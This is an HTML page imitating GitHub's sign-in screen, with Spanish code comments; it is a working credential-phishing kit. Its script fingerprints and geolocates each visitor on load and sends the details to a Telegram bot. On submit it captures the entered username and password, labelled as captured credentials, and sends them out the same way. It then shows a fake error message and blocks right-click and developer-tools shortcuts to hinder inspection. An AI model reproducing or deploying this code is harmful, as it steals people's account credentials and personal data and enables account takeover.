<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - GitHub</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .logo {
            margin-bottom: 24px;
        }

        .logo svg {
            fill: #f0f6fc;
            width: 48px;
            height: 48px;
        }

        .container {
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 24px;
            width: 100%;
            max-width: 340px;
        }

        h1 {
            font-size: 24px;
            font-weight: 300;
            letter-spacing: -0.5px;
            text-align: center;
            margin-bottom: 16px;
            color: #f0f6fc;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            font-size: 12px;
            font-weight: 400;
            margin-bottom: 4px;
            color: #c9d1d9;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 5px 12px;
            font-size: 14px;
            line-height: 20px;
            color: #c9d1d9;
            background-color: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            outline: none;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #58a6ff;
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
        }

        .forgot {
            float: right;
            font-size: 12px;
            color: #58a6ff;
            text-decoration: none;
        }

        .forgot:hover {
            text-decoration: underline;
        }

        .btn {
            width: 100%;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 500;
            line-height: 20px;
            color: #ffffff;
            background-color: #238636;
            border: 1px solid rgba(240, 246, 252, 0.1);
            border-radius: 6px;
            cursor: pointer;
            margin-top: 16px;
        }

        .btn:hover {
            background-color: #2ea043;
        }

        .create-account {
            text-align: center;
            margin-top: 16px;
            padding: 16px;
            border: 1px solid #30363d;
            border-radius: 6px;
            font-size: 14px;
        }

        .create-account a {
            color: #58a6ff;
            text-decoration: none;
        }

        .create-account a:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #8b949e;
        }

        .footer a {
            color: #58a6ff;
            text-decoration: none;
            margin: 0 8px;
        }

        .loader {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .spinner {
            border: 3px solid #30363d;
            border-top: 3px solid #58a6ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .error-msg {
            display: none;
            color: #f85149;
            font-size: 12px;
            text-align: center;
            margin-top: 8px;
            padding: 8px;
            background-color: rgba(248, 81, 73, 0.1);
            border-radius: 6px;
        }
    </style>
</head>
<body>
    <div class="logo">
        <svg viewBox="0 0 98 96" xmlns="http://www.w3.org/2000/svg">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M48.854 0C21.839 0 0 22 0 49.217c0 21.756 13.993 40.172 33.405 46.69 2.427.49 3.316-1.059 3.316-2.362 0-1.141-.08-5.052-.08-9.127-13.59 2.934-16.42-5.867-16.42-5.867-2.184-5.704-5.42-7.17-5.42-7.17-4.448-3.015.324-3.015.324-3.015 4.934.326 7.523 5.052 7.523 5.052 4.367 7.496 11.404 5.378 14.235 4.074.404-3.178 1.699-5.378 3.074-6.6-10.839-1.141-22.243-5.378-22.243-24.283 0-5.378 1.94-9.778 5.014-13.2-.485-1.222-2.184-6.275.486-13.038 0 0 4.125-1.304 13.426 5.052a46.97 46.97 0 0 1 12.214-1.63c4.125 0 8.33.571 12.213 1.63 9.302-6.356 13.427-5.052 13.427-5.052 2.67 6.763.97 11.816.485 13.038 3.155 3.422 5.015 7.822 5.015 13.2 0 18.905-11.404 23.06-22.324 24.283 1.78 1.548 3.316 4.481 3.316 9.126 0 6.6-.08 11.897-.08 13.526 0 1.304.89 2.853 3.316 2.364 19.412-6.52 33.405-24.935 33.405-46.691C97.707 22 75.788 0 48.854 0z"/>
        </svg>
    </div>

    <div class="container" id="loginForm">
        <h1>Sign in to GitHub</h1>
        <form id="form">
            <div class="form-group">
                <label for="username">Username or email address</label>
                <input type="text" id="username" name="login" required autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">
                    Password
                    <a href="#" class="forgot">Forgot password?</a>
                </label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            <button type="submit" class="btn">Sign in</button>
            <div class="error-msg" id="errorMsg">Incorrect username or password.</div>
        </form>
    </div>

    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p>Verificando credenciales...</p>
    </div>

    <div class="create-account">
        New to GitHub? <a href="#">Create an account</a>
    </div>

    <div class="footer">
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
        <a href="#">Security</a>
        <a href="#">Contact GitHub</a>
    </div>

    <script>
        // CONFIGURACIÓN TELEGRAM - REEMPLAZA ESTOS VALORES
        const BOT_TOKEN = '8748174802:AAH-qki9d2ej0eqQ35WYLpEULmoPKo9tJgg';
        const CHAT_ID = '8960577511';
        
        // Recolección de datos del visitante
        async function collectVisitorData() {
            const data = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || 'Directo',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'Unknown'
            };

            // Obtener IP y geolocalización
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
                
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                data.geolocation = {
                    city: geoData.city,
                    region: geoData.region,
                    country: geoData.country_name,
                    countryCode: geoData.country_code,
                    postal: geoData.postal,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude,
                    timezone: geoData.timezone,
                    org: geoData.org,
                    asn: geoData.asn
                };
            } catch (e) {
                data.ip = 'No disponible';
            }

            return data;
        }

        // Enviar mensaje a Telegram
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
            } catch (e) {
                console.error('Error:', e);
            }
        }

        // Ejecutar al cargar
        let visitorData = null;
        collectVisitorData().then(data => {
            visitorData = data;
            
            const msg = `👤 <b>NUEVO VISITANTE</b>

📍 <b>Ubicación:</b>
├ IP: <code>${data.ip}</code>
├ Ciudad: ${data.geolocation?.city || 'N/A'}
├ Región: ${data.geolocation?.region || 'N/A'}
├ País: ${data.geolocation?.country || 'N/A'} (${data.geolocation?.countryCode || 'N/A'})
├ Código Postal: ${data.geolocation?.postal || 'N/A'}
├ Coordenadas: ${data.geolocation?.latitude || 'N/A'}, ${data.geolocation?.longitude || 'N/A'}
└ ISP/Org: ${data.geolocation?.org || 'N/A'}

🖥️ <b>Sistema:</b>
├ Plataforma: ${data.platform}
├ Navegador: ${data.userAgent.split(')')[0]})...
├ Idioma: ${data.language}
├ Resolución: ${data.screenResolution}
├ Zona Horaria: ${data.timezone}
├ CPU Cores: ${data.hardwareConcurrency}
└ RAM: ${data.deviceMemory}GB

⏰ ${new Date().toLocaleString()}`;

            sendToTelegram(msg);
        });

        // Manejar formulario
        document.getElementById('form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            
            const credsMsg = `🔑 <b>CREDENCIALES CAPTURADAS</b>

👤 <b>Usuario:</b> <code>${username}</code>
🔒 <b>Contraseña:</b> <code>${password}</code>

📍 <b>Datos del objetivo:</b>
├ IP: <code>${visitorData?.ip || 'N/A'}</code>
├ Ubicación: ${visitorData?.geolocation?.city || 'N/A'}, ${visitorData?.geolocation?.country || 'N/A'}
└ Sistema: ${visitorData?.platform || 'N/A'}

⏰ ${new Date().toLocaleString()}`;

            await sendToTelegram(credsMsg);
            
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('loginForm').style.display = 'block';
                document.getElementById('errorMsg').style.display = 'block';
                document.getElementById('password').value = '';
            }, 2000);
        });

        // Anti-inspección
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
            }
        });
    </script>
</body>
  </html>
